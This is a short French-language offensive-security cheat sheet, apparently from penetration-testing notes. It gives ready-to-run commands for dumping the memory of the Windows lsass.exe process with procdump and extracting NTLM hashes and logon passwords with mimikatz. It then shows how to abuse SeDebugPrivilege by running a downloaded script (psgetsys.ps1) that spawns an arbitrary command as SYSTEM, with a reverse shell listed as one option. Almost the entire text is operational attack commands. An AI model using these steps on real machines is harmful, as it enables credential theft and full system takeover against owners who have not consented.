#### Faire un dump du process [Lsass.exe](../../../Ressources/Windows/Lsass.exe.md) via procdump (dans le cas d'une connexion RDP il est aussi possible d'effectuer le dump du process depuis le gestionnaire des tâches)

```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

#### On lance ensuite mimiktaz afin de récupérer les hashs NTLM présents dans le dump de [Lsass.exe](../../../Ressources/Windows/Lsass.exe.md)

```powershell
mimikatz.exe
log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

---
## SeDebugPrivilege : RCE en tant qu'utilisateur SYSTEM

#### On récupère le PID d'un process lancé avec l'utilisateur SYSTEM (winlogon.exe est un bon candidat)

```powershell
tasklist
```

Ensuite, on télécharge le script "psgetsys.ps1" et on l'exécute, ce qui permettra de lancer une commande de notre choix en tant qu'utilisateur SYSTEM (un reverse shell, cmd.exe, powershell.exe...): https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1

```powershell
.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
```

